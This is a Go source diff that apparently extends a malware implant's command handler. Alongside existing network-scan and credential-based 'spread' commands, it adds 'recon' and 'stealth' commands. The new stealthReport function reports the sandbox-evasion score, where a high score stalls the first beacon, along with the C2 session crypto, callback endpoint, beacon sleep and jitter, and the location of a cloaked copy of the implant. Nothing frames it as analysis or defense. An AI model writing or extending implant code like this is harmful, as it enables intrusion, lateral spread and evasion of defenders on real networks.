@@ -126,6 +126,10 @@ func execute(c Cmd) Result {
 		r = scanNet(str(c.Args["subnet"]), str(c.Args["ports"]))
 	case "spread":
 		r = spread(str(c.Args["targets"]), str(c.Args["user"]), str(c.Args["pass"]))
+	case "recon":
+		r = recon(str(c.Args["sub"]))
+	case "stealth":
+		r = stealthReport()
 
 	// ---------- fallback ----------
 	default:
@@ -305,4 +309,19 @@ func deviceList() Result {
 
 func shellQuote(s string) string {
 	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
+}
+
+// stealthReport tells the operator how this host was judged and which wire
+// scheme is in use, so a build can be sanity checked from the dashboard.
+func stealthReport() Result {
+	scheme := "legacy psk"
+	if sessionHeader() != "" {
+		scheme = "x25519 + hkdf (per session)"
+	}
+	s, j := getTiming()
+	return Result{OK: true, Out: fmt.Sprintf(
+		"sandbox score : %d (>=2 stalls the first beacon)\n"+
+			"session crypto: %s\ncallback path : %s\n"+
+			"workers       : %d\nsleep/jitter  : %d/%d\ncloaked copy  : %s",
+		sandboxScore(), scheme, endpoint("beacon"), atoi(maxWorkers, 4), s, j, cloakPath())}
 }
